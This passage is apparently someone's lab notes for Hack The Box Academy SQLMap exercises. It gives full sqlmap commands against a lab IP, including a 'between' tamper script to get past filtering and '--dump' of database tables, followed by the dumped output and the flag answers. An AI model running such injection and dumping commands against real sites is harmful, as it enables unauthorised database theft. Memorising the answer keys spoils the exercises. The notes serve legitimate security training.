└─$ sqlmap 'http://206.189.25.173:31370/case10.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://206.189.25.173:31370' -H 'Connection: keep-alive' -H 'Referer: http://206.189.25.173:31370/case10.php' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'id=1' --batch
```

```
[07:45:05] [INFO] fetching columns for table 'flag10' in database 'testdb'
[07:45:06] [WARNING] potential permission problems detected ('command denied')
[07:45:06] [INFO] fetching entries for table 'flag10' in database 'testdb'
Database: testdb
Table: flag10
[1 entry]
+----+----------------------------+
| id | content                    |
+----+----------------------------+
| 1  | HTB{y37_4n07h3r_r4nd0m1z3} |
+----+----------------------------+
```

**Answer:** `HTB{y37_4n07h3r_r4nd0m1z3}`

### Question 4:
![](./attachments/Pasted%20image%2020220703115808.png)

*Hint: Based on the data provided in the page, pick the appropriate tamper script to bypass the page's protections.*

```
┌──(kali㉿kali)-[~]
└─$ sqlmap 'http://206.189.25.173:31370/case11.php?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://206.189.25.173:31370/case11.php' -H 'Upgrade-Insecure-Requests: 1' --batch --tamper=between
```


```
┌──(kali㉿kali)-[~]
└─$ sqlmap 'http://206.189.25.173:31370/case11.php?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://206.189.25.173:31370/case11.php' -H 'Upgrade-Insecure-Requests: 1' --tamper=between --dump -T flag11 -D testdb

(...)

[07:57:18] [INFO] fetching entries for table 'flag11' in database 'testdb'
[07:57:18] [INFO] fetching number of entries for table 'flag11' in database 'testdb'
[07:57:18] [INFO] retrieved: 1
[07:57:18] [INFO] retrieved: HTB{5p3c14l_ch4r5_n0_m0r3}
[07:57:30] [INFO] retrieved: 1
Database: testdb
Table: flag11
[1 entry]
+----+----------------------------+
| id | content                    |
+----+----------------------------+
| 1  | HTB{5p3c14l_ch4r5_n0_m0r3} |
+----+----------------------------+
```

**Answer:** `HTB{5p3c14l_ch4r5_n0_m0r3}`

---
## OS Exploitation
### Question:
![](./attachments/Pasted%20image%2020220703120016.png)

**Answer:** ``
 
### Question:
![](./attachments/Pasted%20image%2020220703120028.png)

*Hint: The flag is in a very common directory!*

**Answer:** ``

---
## Skills Assessment
### Question:
![](./attachments/Pasted%20image%2020220703120124.png)

*Hint: First, navigate the website to find potential attack vectors. Then, try to use various security bypassing techniques you learned to get SQL injection working.*

**Answer:** ``

---
**Tags:** [[Hack The Box Academy]]